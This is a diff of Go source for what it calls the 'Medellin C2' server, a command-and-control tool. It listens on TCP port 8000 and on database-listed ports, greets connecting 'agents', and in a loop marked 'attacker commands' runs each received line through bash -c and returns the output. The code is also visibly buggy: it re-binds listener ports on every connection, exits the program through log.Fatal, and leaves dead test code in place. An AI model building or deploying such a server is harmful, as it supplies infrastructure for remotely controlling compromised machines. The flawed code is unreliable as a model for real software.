@@ -67,9 +67,9 @@ func handleConnection(c net.Conn) {
 
 func listenForConnections() {
 
-	println(logo)
-	println("Medlelin C2 Server Successfully Started...")
-	println("Listeners are running over ports: " + data.GetListenerPorts())
+	//println(logo)
+	//println("Medlelin C2 Server Successfully Started...")
+	//println("Listeners are running over ports: " + data.GetListenerPorts())
 
 	//Allows us to listen over multiple ports
 	for _, port := range checkListenerPorts() { //When you don't really care about the index use _,
@@ -124,7 +124,7 @@ func handleClientRequest(con net.Conn) {
 	defer con.Close()
 
 	clientReader := bufio.NewReader(con)
-
+	println("A new agent has successfully connected")
 	for {
 		// Waiting for the client request
 		clientRequest, err := clientReader.ReadString('\n')
@@ -133,13 +133,13 @@ func handleClientRequest(con net.Conn) {
 		case nil:
 			clientRequest := strings.TrimSpace(clientRequest)
 			if clientRequest == ":QUIT" {
-				log.Println("client requested server to close the connection so closing")
+				log.Println("agent willingly requested server to close the connection so closing")
 				return
 			} else {
-				log.Println(clientRequest)
+				//log.Println(clientRequest)	//prints out user input after the new agent outputs "agent successfully connected" to server console
 			}
 		case io.EOF:
-			log.Println("client closed the connection by terminating the process")
+			log.Println("agent died. closed the connection by terminating the process")
 			return
 		default:
 			log.Printf("error: %v\n", err)
@@ -147,31 +147,11 @@ func handleClientRequest(con net.Conn) {
 		}
 
 		// Responding to the client request
-		if _, err = con.Write([]byte("GOT IT!\n")); err != nil {
+		if _, err = con.Write([]byte("Command succesfully executed. Successfully Connected to MedellinC2! Please Continue interacting with your agent\n")); err != nil {
 			log.Printf("failed to respond to client: %v\n", err)
 		}
-	}
-}
 
-func server() {
-	println(logo)
-	listener, err := net.Listen("tcp", "0.0.0.0:8000")
-	if err != nil {
-		log.Fatalln(err)
-	}
-	defer listener.Close()
-	println("Medellin C2 Server Successfully Started on 0.0.0.0:8000")
-	for {
-		con, err := listener.Accept()
-		if err != nil {
-			log.Println(err)
-			continue
-		}
-
-		// If you want, you can increment a counter here and inject to handleClientRequest below as client identifier
-		go handleClientRequest(con)
-
-		//attacker commands
+		//attacker commmands
 		for {
 			attackerCommands, _ := bufio.NewReader(con).ReadString('\n')
 			cmd := exec.Command("bash", "-c", attackerCommands)
@@ -182,7 +162,74 @@ func server() {
 
 			con.Write(out)
 		}
+		//if connection closes after some commands were ran print to server console
+	}
+}
+
+func server() {
+	println(logo)
+	//test()
+	listener, err := net.Listen("tcp", "0.0.0.0:8000") //start TCP server on 8000
+	if err != nil {
+		log.Fatalln(err)
+	}
+	defer listener.Close()
+
+	println("Medellin C2 Server Successfully Started on 0.0.0.0:8000")
+	for {
+		con, err := listener.Accept()
+		if err != nil {
+			log.Println(err)
+			continue
+		}
+
+		//test
+		test()
+		//end of test
+
+		// If you want, you can increment a counter here and inject to handleClientRequest below as client identifier
+		go handleClientRequest(con)
+		//go acceptLoop(listener2) //run Accept Loop in its own goroutine
+		//check if more ports are open
 	}
 }
 
 // http://www.inanzzz.com/index.php/post/j3n1/creating-a-concurrent-tcp-client-and-server-example-with-golang
+
+// Accept Loop
+func acceptLoop(l net.Listener) {
+	defer l.Close()
+	for {
+		c, err := l.Accept()
+		if err != nil {
+			log.Fatal(err)
+		}
+		fmt.Println("New Connection found")
+		handleClientRequest(c)
+	}
+}
+
+func test() {
+	//Check all open ports in Listeners table in a loop and allow connections over those ports
+	//format checkListenerPorts()
+	s := data.GetListenerPorts() //string that contains every port
+	//v := strings.SplitAfter(s, ",")
+	v := strings.SplitN(s, ",", len(s))
+	//fmt.Print(v)
+	for i := 0; i < len(v); i++ {
+		println(v[i])
+		listener2, err := net.Listen("tcp", "0.0.0.0:"+v[i])
+		if err != nil { //error handling
+			log.Fatal(err)
+		}
+		go acceptLoop(listener2)
+	}
+	/*
+		for _, port := range ListenerPorts() { //for all ports in the listeners table in the DB
+			listener2, err := net.Listen("tcp", "0.0.0.0:"+s[port]) //create listener over port
+			if err != nil {                                      //error handling
+				log.Fatal(err)
+			}
+			go acceptLoop(listener2)
+		} */
+}
